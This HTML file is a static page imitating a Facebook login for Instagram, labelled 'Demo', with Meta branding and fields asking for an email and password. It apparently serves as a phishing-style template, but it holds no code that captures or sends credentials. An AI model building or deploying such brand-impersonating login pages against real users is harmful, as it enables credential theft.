<!DOCTYPE html>

<html>

<head>
  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continue with Facebook to Instagram | Demo</title>
  <link rel="stylesheet" href="src/login.css">
</head>

<body>

  <div id="header">
    <img src="assets/icon11.jpeg" height="30px" id="ic10">
  </div>
  <div class="space1"></div>

<div class="center_container">
    <img src="assets/insta.png" width="90px">
    <p id="para">Log into your Facebook account to connect into Instagram</p>

    <input type="text" id="username" placeholder="Mobile number or email address" class="input">
    <input type="password" id="password" placeholder="Password" class="input">
    <br><br>
    <input type="button" value="Log In" name="Log" id="LogIn_btn">

    <div class="help_options">
      <div class="space4"></div>
      <a href="https://m.facebook.com/login/identify/" target="_blank" class="help_links">Forgotten password?</a>
      <div class="space1"></div>
      <a href="https://m.facebook.com/r.php?soft=hjk" target="_blank" class="help_links">Create account</a>
      <div class="space5"></div>
      <a href="https://m.facebook.com/help/?locale2=en_GB&refid=9" target="_blank" class="help_links">Help Centre</a>
    </div>
    
    <p class="brand_right"> Meta &copy; 2023</p>
</div>

</body>

</html>
